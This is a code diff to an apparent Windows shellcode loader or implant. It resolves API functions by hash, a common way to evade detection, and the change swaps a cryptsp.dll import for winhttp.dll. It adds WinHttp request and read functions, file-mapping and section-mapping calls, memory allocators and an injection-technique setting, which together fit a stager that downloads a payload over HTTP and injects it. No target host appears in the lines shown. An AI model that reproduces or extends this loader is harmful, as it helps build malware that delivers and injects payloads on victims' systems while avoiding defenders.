@@ -34,10 +34,12 @@ BOOL InitInstance(
     PVOID Ntdll    = LdrModuleAddr( H_MODULE_NTDLL );
     PVOID Kernel32 = LdrModuleAddr( H_MODULE_KERNEL32 );
     PVOID Cryptsp  = NULL;
-    
+    PVOID Winhttp  = NULL;
+
     Instance.Win32.LoadLibraryA        = LdrFuncAddr( Kernel32, HASH_STR( "LoadLibraryA" ) );
 
-    Cryptsp = Instance.Win32.LoadLibraryA( "cryptsp.dll" );
+    //Cryptsp = Instance.Win32.LoadLibraryA( "cryptsp.dll" );
+    Winhttp = Instance.Win32.LoadLibraryA( "winhttp.dll" );
 
     Instance.Win32.LoadLibraryExA      = LdrFuncAddr( Kernel32, HASH_STR( "LoadLibraryExA" ) );
     Instance.Win32.VirtualAlloc        = LdrFuncAddr( Kernel32, HASH_STR( "VirtualAlloc" ) );    
@@ -48,8 +50,22 @@ BOOL InitInstance(
     Instance.Win32.NtMapViewOfSection  = LdrFuncAddr( Ntdll,    HASH_STR( "NtMapViewOfSection" ) );
     Instance.Win32.CreateFileMappingA  = LdrFuncAddr( Kernel32, HASH_STR( "CreateFileMappingA" ) );
     Instance.Win32.MapViewOfFile       = LdrFuncAddr( Kernel32, HASH_STR( "MapViewOfFile" ) );
-    Instance.Win32.SystemFunction040   = LdrFuncAddr( Cryptsp,  HASH_STR( "SystemFunction040" ) );
-    Instance.Win32.WaitForSingleObject = LdrFuncAddr( Cryptsp,  HASH_STR( "WaitForSingleObject" ) );
+    Instance.Win32.WaitForSingleObject = LdrFuncAddr( Kernel32,  HASH_STR( "WaitForSingleObject" ) );
+    Instance.Win32.CreateFileA         = LdrFuncAddr( Kernel32,  HASH_STR( "CreateFileA" ) );
+
+    Instance.Win32.WinHttpOpen              = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpOpen" ) );
+    Instance.Win32.WinHttpConnect           = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpConnect" ) );
+    Instance.Win32.WinHttpOpenRequest       = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpOpenRequest" ) );
+    Instance.Win32.WinHttpReadData          = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpReadData" ) );
+    Instance.Win32.WinHttpReceiveResponse   = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpReceiveResponse" ) );
+    Instance.Win32.WinHttpSetOption         = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpSetOption" ) );
+    Instance.Win32.WinHttpSendRequest       = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpSendRequest" ) );
+
+    Instance.Win32.LocalAlloc               = LdrFuncAddr( Kernel32,  HASH_STR( "LocalAlloc" ) );
+    Instance.Win32.LocalReAlloc             = LdrFuncAddr( Kernel32,  HASH_STR( "LocalReAlloc" ) );
+    Instance.Win32.LocalFree                = LdrFuncAddr( Kernel32,  HASH_STR( "LocalFree" ) );
+
+    Instance.InjectionTechnique = INJECTION_TECHNIQUE;
 
     return TRUE;
 }
